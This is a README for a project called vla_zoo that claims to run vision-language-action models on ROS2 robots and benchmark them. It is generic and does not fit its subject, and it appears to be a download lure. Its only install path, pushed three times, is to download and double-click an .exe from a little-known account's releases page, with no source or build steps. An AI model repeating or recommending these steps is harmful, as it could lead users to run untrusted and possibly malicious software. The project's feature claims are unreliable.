# 🤖 vla_zoo - Run vision language models on robots

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Merileeiberian597/vla_zoo/releases)

vla_zoo provides tools to run vision-language-action models. This software connects your computer to robot hardware using ROS2. It includes a benchmark suite to test how well models perform in real scenarios. This set of tools helps researchers and students manage robot policies.

## 📥 Getting Started

You need a Windows computer to run this software. Ensure you have at least 16 GB of RAM and a modern graphics card. This software requires a stable internet connection for the first setup.

Visit this page to download the latest version: https://github.com/Merileeiberian597/vla_zoo/releases

## ⚙️ Installation Process

1. Open your web browser and go to https://github.com/Merileeiberian597/vla_zoo/releases.
2. Look for the Assets list under the most recent version.
3. Click the file that ends with .exe to start the download.
4. Save the file to your desktop for easy access.
5. Double-click the file to start the installer.
6. Follow the on-screen prompts.
7. Click Finish when the installer completes the task.

## 🛠️ System Requirements

- Operating System: Windows 10 or Windows 11.
- Processor: Intel Core i7 or AMD Ryzen 7.
- Memory: 16 GB RAM minimum.
- Graphics: NVIDIA GPU with at least 8 GB of video memory.
- Storage: 10 GB of available space.
- Software: ROS2 Humble or newer must be installed on your system.

## 🕹️ Running the Application

Find the vla_zoo icon on your desktop after installation. Double-click the icon to open the main dashboard. The interface shows a list of available models. Select a model from the list. Choose a robot configuration from the settings menu. Press the Start button to begin the inference process. You see visual feedback in the main window. This feedback shows the vision output and the action plan of the robot.

## 📊 Using the Benchmark Tool

The benchmark tool measures how fast your model runs. Open the Benchmark tab inside the software. Select the task you want to test. Press Run to start the simulation. The software tracks the number of frames it processes per second. It also calculates the success rate of the chosen policy. The findings appear in a text report at the end of the run. You can save these reports as CSV files for later review.

## 🔧 Troubleshooting Tips

- The app does not open: Check your graphics card drivers. Download the latest drivers from the NVIDIA website.
- The model fails to load: Make sure your internet connection stays active while the app downloads model weights.
- Robot movement seems slow: Close other programs to free up system memory and processing power.
- Interface looks blurry: Adjust your display scaling settings in Windows to improve text clarity.
- Error messages appear: Copy the error text and save it to a log file. You can find the logs in the installation folder under the /logs directory.

## 📋 Features

- Native ROS2 support for seamless robot communication.
- Pre-built adapters for popular robot hardware.
- High-speed inference engine for real-time model response.
- Complete benchmark suite to evaluate robot learning.
- Visual interface for monitoring action sequences.
- Support for multiple vision-language-action model formats.
- Offline mode for testing when the internet is unavailable.
- Detailed logging for every robot action and decision.

## 🧩 Modifying Settings

Navigate to the Settings menu to change your preferences. You can switch between different camera inputs here if you have multiple sensors connected. Change the simulation speed to test the limits of your robot policies. The connection settings tab lets you update the address for your ROS2 nodes. Save your changes to apply them to your next session.

## 📧 Support and Feedback

Report issues through the GitHub issues page. Attach your log files to help the developers find the problem. Include steps to reproduce the error. Check the documentation folder for guides on advanced configuration. Follow the project on GitHub to receive updates on new versions and features. Keep your software updated to ensure the best performance with current robot models.